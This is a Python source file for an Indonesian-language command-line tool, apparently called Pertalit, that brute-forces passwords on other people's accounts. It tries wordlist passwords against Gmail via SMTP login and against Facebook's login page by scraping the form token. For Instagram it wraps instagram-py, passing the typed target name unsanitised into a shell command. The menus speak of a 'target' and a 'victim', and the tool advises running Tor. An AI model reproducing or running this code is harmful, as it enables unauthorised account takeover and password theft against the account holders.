# /bin/python !
# https://github.com/FilterXyz/

from __future__ import absolute_import
from __future__ import print_function
import os
import threading
import sys
import requests
from bs4 import BeautifulSoup
import smtplib
from time import sleep

passs = ('''
\033[1;91m[\033[1;97m?\033[1;91m] \033[1;92mPilih jenis kata sandi :

\033[1;91m[\033[1;97m1\033[1;91m]\033[1;92m Default
\033[1;91m[\033[1;97m2\033[1;91m]\033[1;92m Custom
\033[1;91m[\033[1;97m3\033[1;91m]\033[1;92m Kembali
\033[1;91m[\033[1;97m0\033[1;91m]\033[1;92m Keluar

\033[1;91FilterXyz\033[1;97m>>\033[1;92m ''')

main_menu = ('''
\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92mPilih Opsi :

\033[1;91m[\033[1;97m1\033[1;91m]\033[1;92m Instagram
\033[1;91m[\033[1;97m2\033[1;91m]\033[1;92m Facebook
\033[1;91m[\033[1;97m3\033[1;91m]\033[1;92m E-mail
\033[1;91m[\033[1;97m4\033[1;91m]\033[1;92m Tentang Bruteforce
\033[1;91m[\033[1;97m5\033[1;91m]\033[1;92m Kontak Author
\033[1;91m[\033[1;97m0\033[1;91m]\033[1;92m Keluar

\033[1;91 [•] FilterXyz\033[1;97m : \033[1;92m ''')

banr = ("""\033[1;92m  
╔═══╦═══╦═══╦════╦═══╦╗──╔══╦════╗
║╔═╗║╔══╣╔═╗║╔╗╔╗║╔═╗║║──╚╣╠╣╔╗╔╗║
║╚═╝║╚══╣╚═╝╠╝║║╚╣║─║║║───║║╚╝║║╚╝
║╔══╣╔══╣╔╗╔╝─║║─║╚═╝║║─╔╗║║──║║
║║──║╚══╣║║╚╗─║║─║╔═╗║╚═╝╠╣╠╗─║║
╚╝──╚═══╩╝╚═╝─╚╝─╚╝─╚╩═══╩══╝─╚╝  
\033[1;91m<═══\033[1;41m\033[1;97m Created by FilterXyz \033[;0m\033[1;91m═══>\033[1;92m""")

about = ("""\033[1;91m[\033[1;97m?\033[1;91m] \033[1;92mBruteforce Informasi :

\033[1;97m➤ \033[1;92m serangan brute-force adalah serangan cryptanalytic yang, secara teori, dapat digunakan untuk mencoba mendekripsi data terenkripsi (kecuali untuk data yang dienkripsi dengan cara yang aman secara teori).[1] Serangan semacam itu dapat digunakan ketika tidak mungkin memanfaatkan kelemahan lain dalam sistem enkripsi (jika ada) yang akan membuat tugas lebih mudah.

Saat menebak kata sandi, metode ini sangat cepat ketika digunakan untuk memeriksa semua kata sandi yang pendek, tetapi untuk kata sandi yang lebih panjang, metode lain seperti serangan kamus digunakan karena pencarian brute force terlalu lama. Kata sandi, frasa sandi, dan kunci yang lebih panjang memiliki nilai yang lebih mungkin, membuatnya secara eksponensial lebih sulit untuk dipecahkan daripada yang lebih pendek.[2]

Serangan brute force dapat dibuat kurang efektif dengan mengaburkan data yang akan dikodekan sehingga lebih sulit bagi penyerang untuk mengenali ketika kode telah di-crack atau dengan membuat penyerang melakukan lebih banyak pekerjaan untuk menguji setiap tebakan. Salah satu ukuran kekuatan sistem enkripsi adalah berapa lama secara teoritis dibutuhkan penyerang untuk melakukan serangan brute force yang berhasil terhadapnya.[3]

Serangan brute-force adalah aplikasi pencarian brute-force, teknik pemecahan masalah umum untuk menghitung semua kandidat dan memeriksa masing-masing kandidat.

\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Fitur Pertalit :

\033[1;97m➤ \033[1;92mAnda dapat melakukan serangan bruteforce pada Instagram, Facebook, dan ID Email korban Anda dengan 100 kata sandi / detik Anda dapat menambahkan daftar kata sandi khusus Anda sendiri dan alat ini juga memiliki daftar kata sandi, jadi Jika Anda tidak memiliki daftar kata sandi Anda sendiri maka tidak apa-apa. jangan khawatir Anda dapat menggunakan fungsi serangan otomatis (Dalam fungsi ini Anda tidak memerlukan daftar kata sandi Anda sendiri).

\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Author:

\033[1;97m➤ \033[1;92mTool Pertalit is created by FilterXyz
\033[1;92m""")

connect_with_us = ("""\033[1;97m
➤ \033[1;92mJika Anda ingin terhubung dengan kami, Anda dapat terhubung, Follow Github FilterXyz'

\033[1;92m
\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Github :
\033[1;97m➤\033[1;92m Github Name : FilterXyz
\033[1;97m➤ \033[1;92mProfile Link:\033[1;94m https://github.com/FilterXyz/
\033[1;92m
\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Whatsapp:
\033[1;97m➤ \033[1;92mNo Whatsapp : +19725344955
\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Donasi Via Dana 
\033[1;97m➤ \033[1;92mNo Dana : 085863483241
\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Donasi Via Pulsa 
\033[1;97m➤ \033[1;92mNo Pulsa : 087749413828""")

def hackmail():
	class GmailBruteForce():
	    def __init__(self):
	        self.accounts = []
	        self.passwords = []
	        self.init_smtplib()
	
	    def get_pass_list(self,path):
	        file = open(path, 'r',encoding='utf8').read().splitlines()
	        for line in file:
	            self.passwords.append(line)
	
	    def init_smtplib(self):
	        self.smtp = smtplib.SMTP("smtp.gmail.com",587)
	        self.smtp.starttls()
	        self.smtp.ehlo()
	    
	    def try_gmail(self):
	
	        for user in self.accounts:
	            for password in self.passwords:
	                try:
	                    self.smtp.login(user,password)
	                    print(("\033[1;37mgood -> %s " % user + " -> %s \033[1;m" % password ))
	                    self.smtp.quit()
	                    self.init_smtplib()
	                    break;
	                except smtplib.SMTPAuthenticationError:
	
	                    print(("\033[1;31msorry %s " % user + " -> %s \033[1;m" % password ))
	
	instance = GmailBruteForce()
	
	headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
	
	instance.accounts.append(usr)
	instance.get_pass_list(passlist)
	
	instance.try_gmail()

def hackbook():
	if sys.version_info[0] !=3: 
		sys.exit()
	
	post_url='https://www.facebook.com/login.php'
	headers = {
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
	}
	payload={}
	cookie={}
	
	def create_form():
		form=dict()
		cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
	
		data=requests.get(post_url,headers=headers)
		for i in data.cookies:
			cookie[i.name]=i.value
		data=BeautifulSoup(data.text,'html.parser').form
		if data.input['name']=='lsd':
			form['lsd']=data.input['value']
		return (form,cookie)
	
	def function(email,passw,i):
		global payload,cookie
		if i%10==1:
			payload,cookie=create_form()
			payload['email']=email
		payload['pass']=passw
		r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
		if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text:
			open('temp','w').write(str(r.content))
			print('\nPassword : ',passw)
			return True
		return False
	
	file=open(passlist,'r')
	
	print("\nID Target :",usr)
	print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92mMencoba Kata Sandi dari daftar kata sandi Anda ..." , '\033[1;91m', '\n' )
	
	i=0
	while file:
		passw=file.readline().strip()
		i+=1
		if len(passw) < 6:
			continue
		print(str(i) +" : ",passw)
		if function(usr,passw,i):
			break



# main script start

while True:
	os.system('clear')
	print(banr)
	menu = input(main_menu)
	if menu == '01' or menu == '1':
		print('\n\033[1;91m[\033[1;97m#\033[1;91m]\033[1;92m Jalankan tor di sesi termux lainnya')
		sleep(1)
		while True:
			usr = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Username Target :\033[1;97m ')
			if usr == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Tidak ada nama pengguna yang terdeteksi\n')
			else:
				break
			
		while True:
			pas = input(passs)
			if pas == '01' or pas == '1':
				print()
				os.system("instagram-py --username " + usr + " --password-list .pass.txt")
				break
			elif pas == '02' or pas == '2':
				print()
				passlist = input('\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m List daftar kata sandi: \033[1;97m')
				os.system("instagram-py --username " + usr + " --password-list " + passlist)
				break
			elif pas == '3' or pas == '03':
				break
			elif pas == '0' or pas == '00':
				exit()
				
	elif menu == '02' or menu == '2':
		while True:
			usr = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Target User ID :\033[1;97m ')
			if usr == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m ID pengguna tidak terdeteksi')
			else:
				break
		while True:
			pas = input(passs)
			if pas == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Tidak ada masukan yang terdeteksi')
			elif pas == '01' or pas == '1':
				print()
				passlist = '.pass.txt'
				break
			elif pas == '02' or pas == '2':
				print()
				passlist = input('\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m List daftar kata sandi:\033[1;97m ')
				if passlist == '':
					print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Tidak ada masukan yang terdeteksi')
				else:
					break
			elif pas == '03' or pas == '3':
				print()
				break
			elif pas == '0' or pas == '00':
				print()
				exit()
			else:
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Masukan tidak valid')
		hackbook()
		exit()
		
	elif menu == '03' or menu == '3':
		while True:
			usr = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Target Email ID :\033[1;97m ')
			if usr == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m ID email tidak terdeteksi')
			else:
				break

		while True:
			pas = input(passs)
			if pas == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Tidak ada masukan yang terdeteksi\n')
			elif pas == '01' or pas == '1':
				print()
				passlist = '.pass.txt'
				break
			elif pas == '02' or pas == '2':
				print()
				passlist = input('\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m List daftar kata sandi:\033[1;97m ')
				if passlist == '':
					print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Tidak ada masukan yang terdeteksi')
				else:
					break
			elif pas == '03' or pas == '3':
				print()
				break
			elif pas == '0' or pas == '00':
				print()
				exit()
			else:
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Masukan tidak valid')

		hackmail()
		exit()

	elif menu == '4' or menu == '04':
		print()
		print(about)
		while True:
			a = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Apakah Anda ingin masuk ke menu utama? \033[1;91m[\033[1;97my/n\033[1;91m]\033[1;92m:\033[1;97m ')
			if a == 'y' or a == 'Y':
				break
			elif a == 'n' or a == 'N':
				exit()
			elif a == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Tidak ada masukan yang terdeteksi')
				sleep(1)
			else:
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Masukan tidak valid')
				sleep(1)

	elif menu == '5' or menu == '05':
		print()
		print(connect_with_us)
		while True:
			a = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Apakah Anda ingin masuk ke menu utama? \033[1;91m[\033[1;97my/n\033[1;91m]\033[1;92m: \033[1;97m')
			if a == 'y' or a == 'Y':
				break
			elif a == 'n' or a == 'N':
				exit()
			elif a == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Tidak ada masukan yang terdeteksi')
				sleep(1)
			else:
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Masukan tidak valid')
				sleep(1)

	elif menu == '00' or menu == '0':
		print()
		exit()
	elif menu == '':
		print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Tidak ada masukan yang terdeteksi')
		sleep(1)
	else:
		print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Masukan tidak valid')
		sleep(1)

